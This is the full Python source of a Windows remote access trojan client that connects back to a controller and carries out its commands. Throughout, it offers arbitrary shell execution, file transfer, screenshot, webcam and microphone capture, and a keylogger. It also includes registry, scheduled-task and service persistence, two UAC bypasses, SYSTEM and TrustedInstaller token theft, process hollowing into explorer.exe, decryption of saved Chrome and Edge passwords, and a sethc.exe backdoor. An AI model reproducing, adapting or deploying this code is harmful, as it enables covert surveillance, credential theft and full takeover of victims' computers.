# coding=utf-8
import base64
import contextlib
import ctypes
import inspect
import json
import locale
import os
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import threading
import time
import wave
import winreg

import cv2
import ntsecuritycon
import psutil
import pyaudio
import pyautogui
import requests
import tabulate
import win32api
import win32con
import win32crypt
import win32process
import win32profile
import win32security
import win32service
import win32ts
from Crypto.Cipher import AES

import keylogger
import runpe

TEMP_DIR = os.path.expanduser('~') + r'\AppData\Local\Temp'
EXECUTABLE_PATH = os.path.realpath(sys.executable)


class Client:
    def __init__(self):
        self.socket = socket.socket()
        self.host = '127.0.0.1'
        self.port = 9999

    def connect(self):
        while self.socket.connect_ex((self.host, self.port)) != 0:
            time.sleep(5)

    def recv(self):
        size = struct.unpack('i', self.socket.recv(4))[0]
        return self.socket.recv(size).decode()

    def recv_file(self, file):
        size = struct.unpack('i', self.socket.recv(4))[0]
        with open(file, 'wb') as f:
            while size:
                buf = self.socket.recv(size)
                size -= len(buf)
                f.write(buf)

    def send(self, status, data):
        status = struct.pack('i', status)
        size = struct.pack('i', len(data))
        self.socket.send(status + size + data)

    def send_text(self, status, data):
        self.send(status, data.encode())

    def send_file(self, filename):
        if os.path.isfile(filename):
            with open(filename, 'rb') as f:
                self.send(1, f.read())
        else:
            self.send_text(0, '[-] File not found')

    def recv_commands(self):
        command = Command()
        self.send_text(1, str(os.getcwd()) + '> ')
        cmd = self.recv()
        cmd_name = cmd.split(' ')[0]
        cmd_arg = cmd[len(cmd_name) + 1:].strip()
        if cmd == 'null':
            pass
        elif cmd == 'kill':
            self.socket.close()
            sys.exit(0)
        elif hasattr(command, cmd_name):
            func = getattr(command, cmd_name)
            args = inspect.getfullargspec(func).args
            argc = len(args)
            if not argc:
                status, data = func()
                self.send_text(status, data)
            elif 'client' in args:
                if argc == 1:
                    func(self)
                else:
                    func(self, cmd_arg)
            else:
                status, data = func(cmd_arg)
                self.send_text(status, data)
        else:
            status, data = command.execute(cmd)
            self.send_text(status, data)


class Command:
    @staticmethod
    def cd(path):
        try:
            if not path:
                return 0, 'null'
            if os.path.exists(path):
                os.chdir(path)
                return 1, 'null'
            else:
                return 0, '[-] Cannot find the path specified'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def run(process):
        try:
            if not process:
                return 0, '[-] No process name specified'
            p = subprocess.Popen(process)
            return 1, '[+] Process created: ' + str(p.pid)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def execute(command):
        try:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            result = str(cmd.stdout.read() + cmd.stderr.read(), locale.getdefaultlocale()[1])
            if not result:
                result = 'null'
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def upload(client, filename):
        try:
            client.recv_file(filename)
            client.send_text(1, '[+] File uploaded successfully')
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def download(client, filename):
        try:
            client.send_file(filename)
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def screenshot(client):
        try:
            filename = TEMP_DIR + r'\screenshot.png'
            pyautogui.screenshot(filename)
            client.send_file(filename)
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))
            return
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def webcam(client):
        try:
            filename = TEMP_DIR + r'\webcam.png'
            capture = cv2.VideoCapture(0)
            success, image = capture.read()
            if success:
                cv2.imwrite(filename, image)
                capture.release()
                client.send_file(filename)
            else:
                client.send_text(0, '[-] Webcam not found')
                return
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))
            return
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def record(client, seconds):
        chunk = 1024
        sample_format = pyaudio.paInt16
        channels = 2
        rate = 44100
        filename = TEMP_DIR + r'\output.wav'
        try:
            seconds = int(seconds)
        except:
            seconds = 10
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=sample_format, channels=channels, rate=rate, frames_per_buffer=chunk, input=True)
            frames = []
            for i in range(0, int(rate / chunk * seconds)):
                data = stream.read(chunk)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            f = wave.open(filename, 'wb')
            f.setnchannels(channels)
            f.setsampwidth(p.get_sample_size(sample_format))
            f.setframerate(rate)
            f.writeframes(b''.join(frames))
            f.close()
            client.send_file(filename)
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))
            return
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def keylogger_start():
        try:
            klg = keylogger.Keylogger().get_instance()
            if klg.status():
                return 0, '[-] Keylogger already started'
            else:
                threading.Thread(target=klg.start, daemon=True).start()
                return 1, '[+] Keylogger started'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def keylogger_stop():
        try:
            klg = keylogger.Keylogger().get_instance()
            if klg.status():
                klg.stop()
                return 1, '[+] Keylogger stopped'
            else:
                return 0, '[-] Keylogger not running'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def keylogger_save(client):
        try:
            client.send_file(TEMP_DIR + r'\output.txt')
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def persistence_registry():
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                 winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'reverse_shell', 0, winreg.REG_SZ, EXECUTABLE_PATH)
            winreg.CloseKey(key)
            return 1, '[+] Create registry key success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_schtasks():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                cmd = subprocess.Popen(
                    'schtasks.exe /create /tn reverse_shell /sc onlogon /ru system /rl highest /tr {0} /f'.format(
                        EXECUTABLE_PATH),
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return 1, '[+] Schedule task success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                              locale.getdefaultlocale()[1])
            else:
                return 0, '[-] Operation requires elevation'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_service():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                cmd = subprocess.Popen(
                    'sc create reverse_shell binpath= \"{0}\" start= auto'.format(EXECUTABLE_PATH),
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return 1, '[+] Create service success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                               locale.getdefaultlocale()[1])
            else:
                return 0, '[-] Operation requires elevation'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_fodhelper():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                reg_path = r'Software\Classes\ms-settings\shell\open\command'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, EXECUTABLE_PATH)
                winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
                p = subprocess.Popen(r'C:\Windows\System32\fodhelper.exe', shell=True)
                p.communicate()
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
                winreg.DeleteValue(key, 'DelegateExecute')
                winreg.CloseKey(key)
                return 1, '[+] Bypass UAC success'
            else:
                return 0, '[-] Already elevated as administrator'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_clr():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                filename = 'bypassuac_clr.dll'
                if not os.path.isfile(filename):
                    return 0, '[-] Missing {0}'.format(filename)
                dll_path = os.path.abspath(filename)
                reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_EXPAND_SZ, dll_path)
                winreg.CloseKey(key)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'COR_PROFILER', 0, winreg.REG_SZ, '{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}')
                winreg.SetValueEx(key, 'COR_PROFILER_PATH', 0, winreg.REG_SZ, dll_path)
                winreg.SetValueEx(key, 'COR_ENABLE_PROFILING', 0, winreg.REG_SZ, '1')
                p = subprocess.Popen('mmc eventvwr.msc', shell=True)
                p.communicate()
                winreg.DeleteValue(key, 'COR_PROFILER')
                winreg.DeleteValue(key, 'COR_PROFILER_PATH')
                winreg.DeleteValue(key, 'COR_ENABLE_PROFILING')
                winreg.CloseKey(key)
                return 1, '[+] Bypass UAC success'
            else:
                return 0, '[-] Already elevated as administrator'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_system():
        try:
            Helper.enable_privilege('SeDebugPrivilege')
            Helper.create_process_as_user(
                Helper.duplicate_token(Helper.get_process_token(Helper.get_pid('winlogon.exe'))))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_ti():
        try:
            Helper.enable_privilege('SeDebugPrivilege')
            Helper.start_service('TrustedInstaller')
            Helper.create_process_as_user(
                Helper.duplicate_token(Helper.get_process_token(Helper.get_pid('TrustedInstaller.exe'))))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_admin():
        try:
            Helper.enable_privilege('SeDebugPrivilege')
            pid = Helper.get_elevated_process()
            if pid is not None:
                Helper.create_process_as_user(
                    Helper.duplicate_token(Helper.get_process_token(pid)))
                return 1, '[+] Success'
            else:
                return 0, '[-] No elevated process found'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_user():
        try:
            Helper.enable_privilege('SeTcbPrivilege')
            Helper.create_process_as_user(Helper.duplicate_token(Helper.get_user_token()))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_admin():
        try:
            Helper.enable_privilege('SeTcbPrivilege')
            Helper.create_process_as_user(Helper.duplicate_token(Helper.get_linked_token(Helper.get_user_token())))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def idletime():
        try:
            return 1, '[+] User has been idle for: ' + str(
                (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0) + ' seconds'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def poweroff():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.ZwShutdownSystem(2)

    @staticmethod
    def setcritical():
        try:
            is_critical = ctypes.c_int(1)
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, os.getpid())
            status = ctypes.windll.ntdll.NtSetInformationProcess(handle_process, 29, ctypes.byref(is_critical),
                                                                 ctypes.sizeof(ctypes.c_int))
            if not status:
                return 1, '[+] Success'
            else:
                return 0, '[-] Error: ' + str(status)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def runpe():
        try:
            src = r'c_client.exe'
            dst = r'C:\Windows\explorer.exe'
            if os.path.isfile(src) and os.path.isfile(dst):
                return 1, runpe.hollow_process(src, dst)
            else:
                return 0, '[-] File not found'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def get_passwords(browser):
        try:
            user_data = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data'
            passwords = Helper.get_passwords(Helper.get_master_key(user_data + r'\Local State'),
                                             user_data + r'\Default\Login Data')
            return 1, json.dumps(passwords, sort_keys=False, indent=4, ensure_ascii=False)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def get_bookmarks(browser):
        try:
            default = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data\Default'
            return 1, Helper.get_bookmarks(default + r'\Bookmarks')
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def get_history(browser):
        try:
            default = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data\Default'
            history = Helper.get_history(default + r'\History')
            return 1, json.dumps(history, sort_keys=False, indent=4, ensure_ascii=False)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def replace_files():
        try:
            sys_dir = r'C:\Windows\System32'
            if os.path.isfile(sys_dir + r'\sethc.exe.bak'):
                return '[-] File already exists'
            cmd_list = [r'takeown /f %s\sethc.exe' % sys_dir,
                        r'icacls %s\sethc.exe /grant administrators:F' % sys_dir,
                        r'move {0}\sethc.exe {0}\sethc.exe.bak'.format(sys_dir),
                        r'copy {0}\cmd.exe {0}\sethc.exe'.format(sys_dir)]
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def list_software():
        try:
            software_list = []
            for item in ((winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY),
                         (winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY),
                         (winreg.HKEY_CURRENT_USER, 0)):
                software_list += Helper.enum_uninstall_key(*item)
            return 1, tabulate.tabulate(sorted(software_list, key=lambda s: s[0].lower()),
                                        headers=['Name', 'Version', 'Publisher']),
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def web_upload(client, filename):
        try:
            if os.path.isfile(filename):
                with open(filename, 'rb') as f:
                    response = requests.post('http://{0}:8888/upload'.format(client.host), files={'file': f})
                    client.send_text(1, response.text)
            else:
                client.send_text(0, '[-] File not found')
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def web_download(client, filename):
        try:
            response = requests.get('http://{0}:8888/uploads/{1}'.format(client.host, filename))
            if response.status_code == 200:
                with open(filename, 'wb') as f:
                    f.write(response.content)
                client.send_text(1, '[+] File downloaded successfully')
            else:
                client.send_text(0, '[-] ' + str(response.status_code))
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))


class Helper:
    browser_dict = {'chrome': r'\Google\Chrome', 'edge': r'\Microsoft\Edge'}

    @staticmethod
    def enable_privilege(privilege):
        privilege_id = win32security.LookupPrivilegeValue(None, privilege)
        new_privilege = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
        handle_token = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
        if handle_token:
            win32security.AdjustTokenPrivileges(handle_token, 0, new_privilege)

    @staticmethod
    def start_service(service):
        handle_scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
        handle_service = win32service.OpenService(handle_scm, service,
                                                  win32service.SERVICE_START | win32service.SERVICE_QUERY_STATUS)
        status = win32service.QueryServiceStatus(handle_service)[1]
        if status == win32service.SERVICE_STOPPED:
            win32service.StartService(handle_service, None)
        win32service.CloseServiceHandle(handle_service)

    @staticmethod
    def get_pid(process):
        for proc in psutil.process_iter():
            if process in proc.name():
                return proc.pid

    @staticmethod
    def get_elevation_type(pid):
        handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
        handle_token = win32security.OpenProcessToken(handle_process, win32con.TOKEN_QUERY)
        return win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenElevationType)

    @staticmethod
    def get_elevated_process():
        for proc in psutil.process_iter():
            with contextlib.suppress(Exception):
                pid = proc.pid
                if Helper.get_elevation_type(pid) == win32security.TokenElevationTypeFull:
                    return pid

    @staticmethod
    def get_process_token(pid):
        handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
        return win32security.OpenProcessToken(handle_process, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY)

    @staticmethod
    def get_user_token():
        console_session_id = win32ts.WTSGetActiveConsoleSessionId()
        return win32ts.WTSQueryUserToken(console_session_id)

    @staticmethod
    def duplicate_token(handle_token):
        return win32security.DuplicateTokenEx(handle_token, 3, win32con.MAXIMUM_ALLOWED,
                                              win32security.TokenPrimary,
                                              win32security.SECURITY_ATTRIBUTES())

    @staticmethod
    def get_linked_token(handle_token):
        return win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenLinkedToken)

    @staticmethod
    def create_process_as_user(handle_token):
        creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
        environment = win32profile.CreateEnvironmentBlock(handle_token, False)
        win32process.CreateProcessAsUser(handle_token, EXECUTABLE_PATH, None, None, None, False,
                                         creation_flags, environment, None, win32process.STARTUPINFO())

    @staticmethod
    def get_master_key(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

    @staticmethod
    def decrypt_password(master_key, buf):
        try:
            cipher = AES.new(master_key, AES.MODE_GCM, buf[3:15])
            password = cipher.decrypt(buf[15:])
            return password[:-16].decode()
        except:
            return None

    @staticmethod
    def get_passwords(master_key, db):
        db_copy = TEMP_DIR + r'\passwords'
        shutil.copy2(db, db_copy)
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        passwords = []
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            password = Helper.decrypt_password(master_key, r[2])
            if username and password:
                passwords.append({'url': url, 'username': username, 'password': password})
        cursor.close()
        conn.close()
        if os.path.isfile(db_copy):
            os.remove(db_copy)
        return passwords

    @staticmethod
    def traverse_bookmarks(items):
        bookmarks = []
        for item in items['children']:
            if item['type'] == 'folder':
                bookmarks.append(Helper.traverse_bookmarks(item))
            else:
                bookmarks.append({'name:': item['name'], 'url': item['url']})
        return {items['name']: bookmarks}

    @staticmethod
    def get_bookmarks(filename):
        with open(filename, encoding='utf-8') as f:
            data = json.load(f)
            bookmark_bar = data['roots']['bookmark_bar']
            other = data['roots']['other']
            return json.dumps([Helper.traverse_bookmarks(bookmark_bar), Helper.traverse_bookmarks(other)], indent=4,
                              ensure_ascii=False)

    @staticmethod
    def get_history(db):
        db_copy = TEMP_DIR + r'\history'
        shutil.copy2(db, db_copy)
        conn = sqlite3.connect(db_copy)
        cursor = conn.cursor()
        cursor.execute('SELECT url, title FROM urls')
        history = []
        for r in cursor.fetchall():
            history.append({'title': r[1], 'url': r[0]})
        cursor.close()
        conn.close()
        if os.path.isfile(db_copy):
            os.remove(db_copy)
        return history

    @staticmethod
    def enum_uninstall_key(reg, flag):
        software_list = []
        key = winreg.OpenKey(reg, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 0, winreg.KEY_READ | flag)
        for i in range(winreg.QueryInfoKey(key)[0]):
            software = []
            try:
                subkey = winreg.OpenKey(key, winreg.EnumKey(key, i))
                software.append(winreg.QueryValueEx(subkey, 'DisplayName')[0])
                try:
                    software.append(winreg.QueryValueEx(subkey, 'DisplayVersion')[0])
                except EnvironmentError:
                    software.append(None)
                try:
                    software.append(winreg.QueryValueEx(subkey, 'Publisher')[0])
                except EnvironmentError:
                    software.append(None)
                software_list.append(software)
            except EnvironmentError:
                continue
        return software_list


while True:
    client = Client()
    client.connect()
    while True:
        try:
            client.recv_commands()
        except socket.error as e:
            print(e)
            client.socket.close()
            client.socket = socket.socket()
            break
        except Exception as ex:
            print(ex)
            continue
